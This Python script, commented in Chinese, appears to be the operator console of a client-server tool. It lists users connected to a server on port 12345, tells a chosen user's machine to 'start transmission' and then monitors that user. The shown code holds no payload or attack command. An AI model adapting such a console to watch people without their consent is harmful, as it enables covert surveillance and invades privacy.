from api.SmartMenu import SmartMenu
from services import Server
import sys
import os

if __name__ == "__main__":
    host = '0.0.0.0'
    port = 12345
    server = Server(host, port)
    choice = sys.maxsize  # 初始化選擇為最大值，避免誤選
    # 啟動伺服器
    server.start_server()

    while True:
        top = 1  # 初始化選單的頂部位置
        choice = sys.maxsize if choice == None or choice < 0 else choice
        # 獲取當前連線的用戶列表
        users = server.get_connected_users()

        # 顯示用戶選單
        options = ["Select users to monitor"]
        if not users:
            options.append("No users online")
            top+=1
        else:
            for i,addr in enumerate(users):
                options.append(f"USER {i + 1}: {addr[0]}")
        options.append("Log out of the server")
        menu = SmartMenu(options, choice,top)  # 使用SmartMenu顯示選單
        temp = menu.show()

        if  temp == len(users):  # 選擇退出
            server.cleanup()
            os.system('cls')
            print("Baye! I will be back!") 
            print(  "\t⣿⣿⣿⣿⣿⠟⠋⠄⠄⠄⠄⠄⠄⠄⢁⠈⢻⢿⣿⣿⣿⣿⣿⣿⣿\n",
                    "\t⣿⣿⣿⣿⣿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⡀⠭⢿⣿⣿⣿⣿\n",
                    "\t⣿⣿⣿⣿⡟⠄⢀⣾⣿⣿⣿⣷⣶⣿⣷⣶⣶⡆⠄⠄⠄⣿⣿⣿⣿\n",
                    "\t⣿⣿⣿⣿⡇⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠄⠄⢸⣿⣿⣿⣿\n",
                    "\t⣿⣿⣿⣿⣇⣼⣿⣿⠿⠶⠙⣿⡟⠡⣴⣿⣽⣿⣧⠄⢸⣿⣿⣿⣿\n",
                    "\t⣿⣿⣿⣿⣿⣾⣿⣿⣟⣭⣾⣿⣷⣶⣶⣴⣶⣿⣿⢄⣿⣿⣿⣿⣿\n",
                    "\t⣿⣿⣿⣿⣿⣿⣿⣿⡟⣩⣿⣿⣿⡏⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n",
                    "\t⣿⣿⣿⣿⣿⣿⣹⡋⠘⠷⣦⣀⣠⡶⠁⠈⠁⠄⣿⣿⣿⣿⣿⣿⣿\n",
                    "\t⣿⣿⣿⣿⣿⣿⣍⠃⣴⣶⡔⠒⠄⣠⢀⠄⠄⠄⡨⣿⣿⣿⣿⣿⣿\n",
                    "\t⣿⣿⣿⣿⣿⣿⣿⣦⡘⠿⣷⣿⠿⠟⠃⠄⠄⣠⡇⠈⠻⣿⣿⣿⣿\n",
                    "\t⣿⣿⣿⣿⡿⠟⠋⢁⣷⣠⠄⠄⠄⠄⣀⣠⣾⡟⠄⠄⠄⠄⠉⠙⠻\n",
                    "\t⡿⠟⠋⠁⠄⠄⠄⢸⣿⣿⡯⢓⣴⣾⣿⣿⡟⠄⠄⠄⠄⠄⠄⠄⠄\n",
                    "\t⠄⠄⠄⠄⠄⠄⠄⣿⡟⣷⠄⠹⣿⣿⣿⡿⠁⠄⠄⠄⠄⠄⠄⠄⠄")
            print("""
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠐⠂⠂⠢⠄⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣶⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣷⣯⡟⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⣰⣾⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡯⠯⠓⠃⠠⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⢀⣾⣿⡿⣿⡿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⣼⠏⠗⠋⠁⠀⠀⠀⠀⠀⠒⠨⠙⠻⣿⣿⣿⣟⠁⠀⠀⠀⠀⢀⣠⣴⣤⣄⡀⠀⠀⠀⠀⠀
                    ⢰⠃⠀⠀⠀⠀⣀⡀⡀⢀⠀⠀⠀⠀⢴⣾⣿⣿⣿⣧⠄⠀⠀⣴⣿⣿⠿⣿⢯⡷⡄⠀⠀⠀⠀
                    ⠃⠀⠀⣰⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠈⢿⣿⣿⣏⢀⡀⠐⢉⠄⠒⠀⠒⠈⠑⡭⠀⠀⠀⠀
                    ⠀⠀⣾⣿⣿⡿⠛⢋⡉⠭⠍⣙⠛⠣⠄⢀⣼⣿⣿⣷⣸⡁⠊⠀⠀⠀⠀⠀⢀⡀⠀⠁⠀⠀⠀
                    ⠀⠀⢹⣿⠏⠀⠈⠀⠀⠀⠀⠀⣈⠀⣠⣾⣭⣻⣿⣿⣷⢻⣶⣶⣿⣴⣴⣶⣶⣶⣶⣶⢦⡄⠀⠀
                    ⠀⠀⠡⠙⢀⣀⣠⠤⠤⠴⣒⣩⣴⣾⣿⣿⠶⡌⣿⣿⣿⣷⢿⣿⣿⣿⣿⣿⣿⢿⣹⠞⡜⠠⠀
                    ⢸⠃⢀⣤⣴⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣯⣿⡵⢻⣿⣿⣿⣯⢷⣿⣿⣿⣟⣿⡿⣽⠎⣌⠡⠀
                    ⢀⢀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣿⣇⠏⢉⡿⡿⠿⠏⠈⠿⠁⠀⠈⠁⠉⠈⠸⠀⠀⠀
                    ⠈⢰⣿⣿⣿⢿⣿⣿⣿⣿⣿⠟⠋⠈⠻⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣶⣤⣄⣀⠀⠀⠀⠸
                    ⠀⠀⠛⡿⣟⣿⡿⡾⡟⠛⠀⢀⣴⣧⡀⢀⣀⡄⠀⠀⠀⠀⠀⠀⠙⣿⠿⣿⣿⡻⡧⠀⠀⠀⠀
                    ⠀⠀⡀⠀⠉⠀⠁⠀⠀⣠⣴⣿⣿⣿⣿⣿⡟⠁⠀⠀⢀⣦⣀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀
                    ⠀⠀⠘⠆⠀⠀⠀⠀⠈⠑⠿⢿⠿⠟⠛⠉⠀⠀⠀⠀⠾⠟⠛⠓⠀⠀⠀⠀⣀⣠⠤⠐⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠢⡀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⢤⣴⣦⣶⢶⣷⢻⠿⠙⠂⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠲⣀⠀⠈⠑⠒⠶⠖⠲⢫⢛⡛⢞⠫⠽⠛⠛⠈⠉⠁⠀⠀⠀⢀⠀⠀⢀⠈⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠈⠲⣀⠀⠀⡀⠠⠀⠠⠠⠠⠠⣀⠀⠀⠀⠀⠀⡰⣝⢾⡙⠦⠁⠀⠂⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢣⠀⠀⡀⡈⠅⢏⠳⣿⣛⠗⠂⠐⠁⠈⢽⣞⡹⡐⠀⠌⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠒⠋⠓⠤⡀⠀⠌⡓⢦⢫⡇⠀⠀⠀⠀⠘⠦⠄⠘⡄⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⢄⡀⠘⠄⢧⡸⠀⠀⠀⠀⠀⡘⠜⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠐⠠⠑⢃⠀⠀⠀⠀⠐⠈⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    """)
            break
        elif choice == sys.maxsize and temp == None:  # 選擇刷新
            continue
        else:
            choice = temp   # 更新選擇的用戶索引
        # 選擇用戶進行監控
        selected_user = users[choice]
        print(f"monitor: {selected_user}")
        server.notify_user_to_start(selected_user)  # 通知用戶開始傳輸
        server.monitor_user(selected_user)
    
exit(0)
